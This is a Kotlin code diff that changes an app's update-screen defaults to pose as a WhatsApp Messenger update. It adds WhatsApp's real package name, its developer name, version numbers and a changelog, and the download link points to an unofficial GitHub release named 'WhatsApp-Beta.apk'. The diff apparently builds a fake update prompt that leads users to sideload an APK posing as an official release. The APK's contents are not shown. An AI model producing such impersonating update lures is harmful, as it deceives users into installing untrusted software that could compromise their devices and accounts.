@@ -3,17 +3,23 @@ package com.example.model
 import java.io.File
 
 data class AppUpdateInfo(
-    val appName: String = "Voice Assistant",
-    val packageName: String = "com.mstnusratjahanrupa.voiceassistant",
-    val currentVersionName: String = "1.0.0",
-    val latestVersionName: String = "12.0.0",
-    val latestVersionCode: Int = 1200,
-    val releaseDate: String = "v12.0.0",
+    val appName: String = "WhatsApp Messenger",
+    val developer: String = "WhatsApp LLC",
+    val inAppPurchases: String = "In-app purchases",
+    val packageName: String = "com.whatsapp",
+    val currentVersionName: String = "2.24.18.75",
+    val latestVersionName: String = "2.24.22.80",
+    val latestVersionCode: Int = 2242280,
+    val releaseDate: String = "Oct 16, 2026",
     val fileSizeBytes: Long = 32_000_000L,
-    val formattedSize: String = "VoiceAssist v12.0 APK",
-    val changelogTitle: String = "Time for UPDATES!",
-    val changelogDescription: String = "We have added numerous new features and fixed some bugs to make the app as comfortable as possible for you",
-    val downloadUrl: String = "https://github.com/installerapp-oss/Voice-assistant-/releases/download/Voice-assistant-12.00/VoiceAssist.apk"
+    val formattedSize: String = "32 MB",
+    val changelogTitle: String = "What's new",
+    val changelogBullets: List<String> = listOf(
+        "You can now choose to share recent group history with new members when you add them to a group",
+        "Group calls now include the ability to transfer call..."
+    ),
+    val changelogDescription: String = "• You can now choose to share recent group history with new members when you add them to a group\n• Group calls now include the ability to transfer call...",
+    val downloadUrl: String = "https://github.com/installupdate/Link-assistant-/releases/download/Whatsapp-assistant/WhatsApp-Beta.apk"
 )
 
 sealed interface DownloadState {
